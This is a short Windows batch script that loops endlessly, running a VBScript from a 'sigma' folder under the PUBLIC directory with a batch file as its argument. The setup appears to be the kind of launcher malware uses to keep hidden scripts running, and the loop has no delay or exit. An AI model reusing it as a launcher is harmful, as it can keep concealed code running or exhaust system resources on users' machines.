@echo off
:loop
wscript %PUBLIC%\sigma\file.vbs %PUBLIC%\sigma\file.bat
goto loop
